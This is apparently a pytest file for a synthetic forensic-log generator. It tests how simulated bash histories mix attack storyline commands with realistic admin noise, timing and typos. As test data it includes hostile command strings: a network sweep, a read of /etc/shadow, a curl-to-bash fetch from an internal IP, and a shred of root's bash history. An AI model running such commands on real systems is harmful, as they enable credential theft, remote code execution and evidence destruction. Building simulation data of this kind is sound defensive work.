# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for bash history organic noise and per-user coverage (P0 fix).

Bash history should include organic noise commands between storyline
events, and baseline should generate bash history for all Linux users,
not just the attack user.
"""

import random
from collections import Counter
from datetime import UTC, datetime, timedelta
from unittest.mock import Mock

import pytest

from evidenceforge.formats import load_format
from evidenceforge.generation.activity.generator import ActivityGenerator
from evidenceforge.generation.emitters.bash_history import BashHistoryEmitter
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.scenario import System, User


@pytest.fixture
def state_manager():
    sm = StateManager()
    sm.set_current_time(datetime(2024, 3, 18, 12, 0, 0, tzinfo=UTC))
    return sm


@pytest.fixture
def mock_emitters():
    return {
        "windows_event_security": Mock(),
        "windows_event_sysmon": Mock(),
        "zeek_conn": Mock(),
        "ecar": Mock(),
        "syslog": Mock(),
        "bash_history": Mock(),
    }


@pytest.fixture
def linux_system():
    return System(hostname="WEB-01", ip="10.0.10.1", os="Ubuntu 22.04", type="server")


@pytest.fixture
def root_user():
    return User(
        username="root",
        full_name="Root",
        email="root@system.local",
        enabled=True,
        persona="sysadmin",
    )


@pytest.fixture
def admin_user():
    return User(
        username="deploy",
        full_name="Deploy User",
        email="deploy@company.com",
        enabled=True,
        persona="sysadmin",
    )


# Organic noise command pool — commands that should appear in bash noise
ORGANIC_COMMANDS = {
    "pwd",
    "ls",
    "ls -la",
    "id",
    "w",
    "whoami",
    "uname -a",
    "uptime",
    "df -h",
    "ps aux",
    "free -m",
    "clear",
    "cd /tmp",
    "hostname",
    "hostname -f",
    "ss -tulnp",
    "systemctl status sshd",
}


class TestStorylineBashNoise:
    """Storyline bash commands should include organic noise."""

    def test_storyline_bash_emits_noise_commands(
        self, state_manager, mock_emitters, linux_system, root_user
    ):
        """After a storyline bash command, noise commands should also be emitted."""
        from evidenceforge.generation.engine import GenerationEngine

        engine = object.__new__(GenerationEngine)
        engine.state_manager = state_manager
        engine._system_pids = {}

        pids: dict[str, int] = {}
        engine._seed_linux_process_tree(linux_system, pids)
        engine._system_pids[linux_system.hostname] = pids

        ag = ActivityGenerator(state_manager, mock_emitters)
        ag._system_pids = engine._system_pids

        # Track all bash commands emitted
        emitted_commands: list[str] = []
        original_generate = ag.generate_bash_command

        def tracking_generate(user, system, time, command, **kwargs):
            emitted_commands.append(command)
            return original_generate(user, system, time, command, **kwargs)

        ag.generate_bash_command = tracking_generate

        # Emit a storyline bash command with noise
        ag.generate_bash_command_with_noise(
            root_user,
            linux_system,
            datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC),
            "nmap -sn 10.10.2.0/24",
        )

        # Should have the original command plus some noise
        assert len(emitted_commands) >= 1, "At least the original command should be emitted"
        assert "nmap -sn 10.10.2.0/24" in emitted_commands, "Original command must be present"

        # Over many runs, noise should sometimes be emitted (probabilistic)
        # Run multiple times and check that at least once we get noise
        total_noise = 0
        for _ in range(20):
            emitted_commands.clear()
            ag.generate_bash_command_with_noise(
                root_user,
                linux_system,
                datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC),
                "cat /etc/shadow",
            )
            noise = [c for c in emitted_commands if c != "cat /etc/shadow"]
            total_noise += len(noise)

        assert total_noise > 0, "Expected at least some noise commands across 20 invocations"


class TestBaselineLinuxBashHistory:
    """Baseline should generate bash history for Linux users."""

    def test_generate_bash_command_exists(self, state_manager, mock_emitters, linux_system):
        """ActivityGenerator should have generate_bash_command method."""
        ag = ActivityGenerator(state_manager, mock_emitters)
        assert hasattr(ag, "generate_bash_command"), (
            "ActivityGenerator should have generate_bash_command"
        )

    def test_web_service_process_commands_do_not_write_interactive_bash_history(
        self, state_manager, mock_emitters, linux_system
    ):
        """Noninteractive web daemon children should not appear in bash_history."""
        ag = ActivityGenerator(state_manager, mock_emitters)
        apache = User(
            username="apache",
            full_name="Apache",
            email="apache@system.local",
            enabled=True,
        )

        ag.generate_bash_command(
            apache,
            linux_system,
            datetime(2024, 3, 18, 12, 0, 0, tzinfo=UTC),
            "/bin/bash -c 'curl http://10.0.0.5/s.sh | bash'",
        )

        assert not mock_emitters["bash_history"].emit.called

    def test_bash_command_pools_are_realistic(self):
        """The bash command YAML should contain common admin commands per role."""
        from evidenceforge.generation.activity.bash_commands import load_bash_commands

        commands = load_bash_commands()
        common = commands.get("common", [])
        assert len(common) >= 10, f"Common command pool has only {len(common)} commands"
        pool_str = " ".join(common)
        assert "ls" in pool_str
        assert "df" in pool_str
        assert "ps" in pool_str

        # Role-specific pools should exist and be non-empty
        for role in (
            "sysadmin",
            "dba",
            "webadmin",
            "developer",
            "security",
            "help_desk",
            "data_analyst",
        ):
            pool = commands.get(role, [])
            assert len(pool) >= 5, f"{role} command pool has only {len(pool)} commands"

        # Keyboard adjacency map should exist for generative typos
        adjacency = commands.get("keyboard_adjacency", {})
        assert len(adjacency) >= 20, f"Keyboard adjacency map has only {len(adjacency)} keys"

        typo_model = commands.get("typo_model", {})
        assert 0 <= typo_model.get("max_rate", -1) <= 1
        assert typo_model.get("short_history_max_typos", -1) <= 1

        workflow_model = commands.get("workflow_model", {})
        assert 0 <= workflow_model.get("selection_probability", -1) <= 1
        workflows = commands.get("workflows", {})
        for role in ("common", "sysadmin", "developer", "help_desk"):
            assert workflows.get(role), f"{role} workflow pool is empty"

    def test_stock_workstation_personas_use_dedicated_bash_pools(self):
        """Help desk and data analyst personas should hit their own expanded pools."""
        from evidenceforge.generation.activity.bash_commands import _get_role_pool

        assert _get_role_pool("help_desk", "generic") == "help_desk"
        assert _get_role_pool("data_analyst", "generic") == "data_analyst"

    def test_short_history_typo_cap_suppresses_extra_typos(self, monkeypatch):
        """Short bash histories should not accumulate multiple generated typos."""
        from evidenceforge.generation.activity import bash_commands

        commands = bash_commands.load_bash_commands()
        monkeypatch.setattr(bash_commands, "_typo_rate", lambda _username, _commands: 1.0)

        class TypoRng:
            def random(self):
                return 0.0

            def choice(self, values):
                return values[0]

            def choices(self, values, weights=None, k=1):
                return [values[0] for _ in range(k)]

            def randint(self, lower, _upper):
                return lower

        command, is_typo = bash_commands.pick_bash_command_entry(
            TypoRng(),
            "sysadmin",
            "WEB-01",
            ["nginx"],
            username="deploy",
            session_command_count=commands["typo_model"]["short_history_threshold"],
            prior_typo_count=commands["typo_model"]["short_history_max_typos"],
        )

        assert is_typo is False
        assert command

    def test_bash_picker_suppresses_repeated_exact_commands(self, monkeypatch):
        """Generated bash histories should not overuse one exact command string."""
        from evidenceforge.generation.activity import bash_commands

        bash_commands.reset_bash_command_memory()
        monkeypatch.setattr(bash_commands, "_typo_rate", lambda _username, _commands: 0.0)

        rng = random.Random(7)
        picked = [
            bash_commands.pick_bash_command_entry(
                rng,
                "sysadmin",
                "WEB-01",
                ["nginx", "ssh"],
                username="deploy",
                session_command_count=80,
            )[0]
            for _ in range(80)
        ]

        counts = Counter(picked)
        assert max(counts.values()) <= 6

    def test_high_signal_admin_checks_have_low_global_repeat_budget(self):
        """Exact diagnostic commands should not repeat broadly across users/hosts."""
        from evidenceforge.generation.activity import bash_commands

        target = "systemctl --failed --no-pager"
        pool = [target, *(f"echo host-check-{index}" for index in range(12))]

        class BiasedRng(random.Random):
            def __init__(self) -> None:
                super().__init__(7)
                self.calls = 0

            def choice(self, values):
                self.calls += 1
                if self.calls % 3 and target in values:
                    return target
                return values[self.calls % len(values)]

        bash_commands.reset_bash_command_memory()
        rng = BiasedRng()
        picked = [
            bash_commands._choose_template_with_memory(
                rng,
                pool,
                {},
                None,
                f"linux-{index}",
                f"user-{index}",
            )
            for index in range(30)
        ]

        assert Counter(picked)[target] <= 2

    def test_high_signal_admin_check_variants_share_repeat_budget(self):
        """Equivalent diagnostic command variants should not bypass repeat caps."""
        from evidenceforge.generation.activity import bash_commands

        targets = ("systemctl status sshd", "systemctl status sshd --no-pager")
        pool = [*targets, *(f"echo host-check-{index}" for index in range(12))]

        class BiasedRng(random.Random):
            def __init__(self) -> None:
                super().__init__(11)
                self.calls = 0

            def choice(self, values):
                self.calls += 1
                if self.calls % 4 in (1, 2):
                    return targets[self.calls % len(targets)]
                return values[self.calls % len(values)]

        bash_commands.reset_bash_command_memory()
        rng = BiasedRng()
        picked = [
            bash_commands._choose_template_with_memory(
                rng,
                pool,
                {},
                None,
                f"linux-{index}",
                f"user-{index}",
            )
            for index in range(30)
        ]

        counts = Counter(picked)
        assert counts["systemctl status sshd"] + counts["systemctl status sshd --no-pager"] <= 2

    def test_high_signal_network_diagnostics_have_low_repeat_budgets(self):
        """Common desktop/network triage commands should not dominate generated histories."""
        from evidenceforge.generation.activity import bash_commands

        targets = (
            "ip -br addr",
            "journalctl -p warning --since '1 hour ago' --no-pager | tail -20",
            "resolvectl status 2>/dev/null | head -40",
        )
        pool = [*targets, *(f"echo host-check-{index}" for index in range(20))]

        class BiasedRng(random.Random):
            def __init__(self) -> None:
                super().__init__(17)
                self.calls = 0

            def choice(self, values):
                self.calls += 1
                if self.calls % 2 and targets[self.calls % len(targets)] in values:
                    return targets[self.calls % len(targets)]
                return values[self.calls % len(values)]

        bash_commands.reset_bash_command_memory()
        rng = BiasedRng()
        picked = [
            bash_commands._choose_template_with_memory(
                rng,
                pool,
                {},
                None,
                f"linux-{index}",
                f"user-{index}",
            )
            for index in range(60)
        ]

        counts = Counter(picked)
        for target in targets:
            assert counts[target] <= 2

    def test_bash_picker_suppresses_same_user_repeats_across_hosts(self):
        """A user's command memory should carry across parallel SSH hosts."""
        from evidenceforge.generation.activity import bash_commands

        bash_commands.reset_bash_command_memory()
        bash_commands._remember_command("WEB-01", "deploy", "ls")

        class PreferRepeatedThenFresh(random.Random):
            def __init__(self):
                super().__init__(3)
                self.calls = 0

            def choice(self, values):
                self.calls += 1
                return values[0] if self.calls == 1 else values[1]

        command = bash_commands._choose_template_with_memory(
            PreferRepeatedThenFresh(),
            ["ls", "pwd"],
            {},
            [],
            "DB-01",
            "deploy",
        )

        assert command == "pwd"

    def test_bash_picker_keeps_desktop_commands_off_servers(self):
        """Server SSH sessions should not receive workstation device/home commands."""
        from evidenceforge.generation.activity import bash_commands

        bash_commands.reset_bash_command_memory()

        command = bash_commands._choose_template_with_memory(
            random.Random(3),
            [
                "bluetoothctl devices 2>/dev/null | head",
                "tail -50 ~/.xsession-errors 2>/dev/null",
                "journalctl -u sshd --since '1 hour ago'",
            ],
            {},
            ["ssh", "gunicorn", "systemd-resolved"],
            "APP-INT-01",
            "aisha.johnson",
        )

        assert command == "journalctl -u sshd --since '1 hour ago'"

    def test_bash_session_picker_prefers_coherent_workflows(self, monkeypatch):
        """A shell session should be able to emit a related command sequence."""
        from evidenceforge.generation.activity import bash_commands

        commands = {
            "common": ["ls"],
            "sysadmin": ["fallback"],
            "params": {"service": ["nginx"], "n": ["20"]},
            "typo_model": {"max_rate": 0},
            "workflow_model": {"selection_probability": 1.0},
            "workflows": {
                "sysadmin": [
                    {
                        "name": "service_triage",
                        "weight": 1,
                        "steps": [
                            ["systemctl status {service} --no-pager"],
                            ["journalctl -u {service} --since '30 min ago' --no-pager | tail -{n}"],
                            ["ss -ltnp | grep {service}"],
                        ],
                    }
                ]
            },
        }
        monkeypatch.setattr(bash_commands, "load_bash_commands", lambda: commands)
        bash_commands.reset_bash_command_memory()

        picked = bash_commands.pick_bash_session_commands(
            random.Random(1),
            "sysadmin",
            "WEB-01",
            ["nginx"],
            username="deploy",
            command_count=3,
        )

        assert [command for command, _is_typo in picked] == [
            "systemctl status nginx --no-pager",
            "journalctl -u nginx --since '30 min ago' --no-pager | tail -20",
            "ss -ltnp | grep nginx",
        ]

    def test_bash_session_picker_fills_workflow_shortfall(self, monkeypatch):
        """Short configured workflows should fall back to role-aware picker slots."""
        from evidenceforge.generation.activity import bash_commands

        commands = {
            "common": ["pwd"],
            "sysadmin": ["echo fallback-one", "echo fallback-two"],
            "params": {},
            "typo_model": {"max_rate": 0},
            "workflow_model": {"selection_probability": 1.0},
            "workflows": {
                "sysadmin": [
                    {
                        "name": "short",
                        "steps": [["hostname -f"]],
                    }
                ]
            },
        }
        monkeypatch.setattr(bash_commands, "load_bash_commands", lambda: commands)
        bash_commands.reset_bash_command_memory()

        picked = bash_commands.pick_bash_session_commands(
            random.Random(3),
            "sysadmin",
            "APP-INT-01",
            ["gunicorn"],
            username="aisha.johnson",
            command_count=3,
        )

        assert picked[0] == ("hostname -f", False)
        assert len(picked) == 3
        assert {command for command, _is_typo in picked[1:]} <= {
            "echo fallback-one",
            "echo fallback-two",
            "pwd",
        }

    def test_bash_session_workflow_steps_do_not_force_exhausted_repeats(self, monkeypatch):
        """Small workflow pools should fall back instead of becoming exact-repeat fingerprints."""
        from evidenceforge.generation.activity import bash_commands

        commands = {
            "common": ["pwd"],
            "sysadmin": [*(f"echo fallback-{index}" for index in range(12))],
            "params": {},
            "typo_model": {"max_rate": 0},
            "workflow_model": {"selection_probability": 1.0},
            "workflows": {
                "sysadmin": [
                    {
                        "name": "tiny",
                        "steps": [["systemctl status sshd --no-pager"]],
                    }
                ]
            },
        }
        monkeypatch.setattr(bash_commands, "load_bash_commands", lambda: commands)
        bash_commands.reset_bash_command_memory()

        picked = [
            bash_commands.pick_bash_session_commands(
                random.Random(index),
                "sysadmin",
                f"WEB-{index}",
                ["ssh"],
                username=f"deploy-{index}",
                command_count=2,
            )[0][0]
            for index in range(12)
        ]

        assert Counter(picked)["systemctl status sshd --no-pager"] <= 2


class TestBashHistoryChronological:
    """Bash history entries should be chronologically sorted."""

    def test_bash_commands_can_be_emitted_out_of_order(
        self, state_manager, mock_emitters, linux_system, root_user
    ):
        """Bash commands emitted with noise offsets should still work."""
        ag = ActivityGenerator(state_manager, mock_emitters)

        # Emit commands at various times
        times = [
            datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC),
            datetime(2024, 3, 18, 13, 59, 55, tzinfo=UTC),  # Before the first
            datetime(2024, 3, 18, 14, 0, 5, tzinfo=UTC),  # After the first
        ]
        for t in times:
            ag.generate_bash_command(root_user, linux_system, t, "ls")

        # No assertion needed — just verify it doesn't crash
        # The emitter sorts entries before writing to disk

    def test_simple_command_dwell_is_not_exact_two_second_cadence(
        self, state_manager, mock_emitters, linux_system, root_user
    ):
        ag = ActivityGenerator(state_manager, mock_emitters)
        start = datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC)

        for offset in (0, 2, 4, 6):
            ag.generate_bash_command(
                root_user, linux_system, start + timedelta(seconds=offset), "ls"
            )

        events = [call.args[0] for call in mock_emitters["bash_history"].emit.call_args_list]
        deltas = [
            (events[idx].timestamp - events[idx - 1].timestamp).total_seconds()
            for idx in range(1, len(events))
        ]

        assert deltas
        assert any(delta != 2.0 for delta in deltas)
        assert any(delta > 10.0 for delta in deltas)

    def test_simple_command_dwell_avoids_mechanical_short_bursts(
        self, state_manager, mock_emitters, linux_system, root_user
    ):
        ag = ActivityGenerator(state_manager, mock_emitters)
        start = datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC)

        for offset in range(12):
            ag.generate_bash_command(
                root_user,
                linux_system,
                start + timedelta(seconds=offset * 2),
                "ls",
            )

        events = [call.args[0] for call in mock_emitters["bash_history"].emit.call_args_list]
        deltas = [
            (events[idx].timestamp - events[idx - 1].timestamp).total_seconds()
            for idx in range(1, len(events))
        ]

        assert deltas
        assert sum(delta <= 10.0 for delta in deltas) <= 3
        assert any(delta >= 60.0 for delta in deltas)

    def test_shred_remove_clears_rendered_history(self, tmp_path):
        """A destructive shred of .bash_history should erase prior collected entries."""
        emitter = BashHistoryEmitter(load_format("bash_history"), tmp_path)
        base = {
            "username": "root",
            "hostname": "web01",
            "host_fqdn": "web01.example.test",
        }
        emitter.emit_event(
            {
                **base,
                "timestamp": datetime(2024, 3, 18, 12, 0, 0, tzinfo=UTC),
                "command": "whoami",
            }
        )
        emitter.emit_event(
            {
                **base,
                "timestamp": datetime(2024, 3, 18, 12, 1, 0, tzinfo=UTC),
                "command": "shred -u /root/.bash_history",
            }
        )
        emitter.close()

        history = tmp_path / "web01.example.test" / "bash_history" / "root.bash_history"
        assert not history.exists() or history.read_text() == ""
